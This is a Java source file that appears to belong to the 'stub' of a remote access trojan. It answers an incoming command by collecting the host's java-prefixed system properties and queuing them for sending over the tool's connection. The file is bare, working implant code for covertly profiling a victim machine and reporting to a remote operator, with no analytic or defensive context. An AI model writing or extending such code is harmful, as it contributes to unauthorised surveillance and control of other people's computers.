package com.redpois0n.stub.packets.incoming;

import java.util.Set;

import com.redpois0n.Connection;
import com.redpois0n.stub.packets.outgoing.Packet44SystemJavaProperty;


public class PacketJVM extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Set<Object> keys = System.getProperties().keySet();
		for (Object obj : keys) {
			if (obj.toString().toLowerCase().startsWith("java")) {
				Connection.addToSendQueue(new Packet44SystemJavaProperty(obj.toString(), System.getProperty(obj.toString())));
			}
		}
	}

}
